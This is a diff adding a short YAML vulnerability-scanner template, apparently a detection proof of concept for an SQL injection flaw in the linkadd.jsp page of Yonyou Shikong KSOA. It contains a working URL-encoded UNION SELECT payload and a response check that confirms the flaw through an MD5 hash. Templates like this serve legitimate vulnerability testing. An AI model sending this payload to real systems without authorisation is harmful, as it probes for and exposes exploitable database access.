@@ -1,0 +1,15 @@
+id: poc-yaml-yysk-ksoa-linkadd-jsp-sqli
+info:
+  name: 用友时空KSOA linkadd.jsp SQL注入漏洞
+  severity: high
+  tags:
+  - sql-injection
+  finger: 用友时空KSOA
+variables:
+  t1: random_int(1000,10000)
+  t2: md5(t1)
+requests:
+- method: GET
+  path: /linksframe/linkadd.jsp?id=666666%27+union+all+select+null%2Cnull%2Csys.fn_sqlvarbasetostr%28HashBytes%28%27MD5%27%2C%27{{.t1}}%27%29%29%2Cnull%2Cnull%2C%27
+  expression: status_code == 200 && contains(title,"Untitled Document") && contains(body,t2)
+transport: http
